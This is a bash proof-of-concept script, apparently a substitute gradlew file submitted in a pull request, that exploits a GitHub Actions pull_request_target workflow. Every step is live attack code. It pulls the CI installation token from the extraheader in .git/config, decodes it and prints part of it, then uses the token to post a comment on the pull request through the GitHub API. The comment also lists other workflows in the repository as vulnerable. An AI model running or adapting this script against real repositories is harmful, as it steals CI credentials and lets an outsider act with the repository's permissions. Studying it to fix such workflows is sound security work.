#!/usr/bin/env bash
# PoC payload: replaces legitimate gradlew. Runs in the pull_request_target context.
# GITHUB_TOKEN isn't auto-set as env for `run:` steps, but actions/checkout
# stashes it in .git/config as http.<url>.extraheader. We pull it from there.
set -e

echo "[pwn] whoami=$(whoami) repo=$GITHUB_REPOSITORY event=$GITHUB_EVENT_NAME"

PR_NUMBER=$(jq -r '.pull_request.number' "$GITHUB_EVENT_PATH")
echo "[pwn] PR_NUMBER=$PR_NUMBER"

EXTRA=$(git config --get http.https://github.com/.extraheader || true)
echo "[pwn] extraheader present: $([ -n "$EXTRA" ] && echo yes || echo no)"
B64=$(printf '%s' "$EXTRA" | awk '{print $3}')
DECODED=$(printf '%s' "$B64" | base64 -d 2>/dev/null || true)
TOKEN=${DECODED#x-access-token:}
echo "[pwn] token prefix: ${TOKEN:0:8}... length=${#TOKEN}"

BODY=$(cat <<EOF
:rotating_light: **pull_request_target PoC** :rotating_light:

This comment was posted by the \`detekt.yml\` workflow itself, using the base repo's installation token, as a direct result of arbitrary code from this PR.

- Trigger: \`pull_request_target\` runs base-repo workflow against attacker-controlled PR head.
- Vector: workflow runs \`./gradlew detekt\` — \`gradlew\` is checked out from the PR.
- Token recovered from \`.git/config\` extraheader stashed by \`actions/checkout\`.
- Permissions granted to this token (per workflow): \`contents: read\`, \`pull-requests: write\`.

Other vulnerable workflows in this repo: \`merge-conflicts.yml\`, \`pr-quality.yml\`.
EOF
)

JSON=$(jq -n --arg body "$BODY" '{body: $body}')

curl -sS -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/$GITHUB_REPOSITORY/issues/$PR_NUMBER/comments" \
  -d "$JSON"

echo
echo "[pwn] done"
exit 0
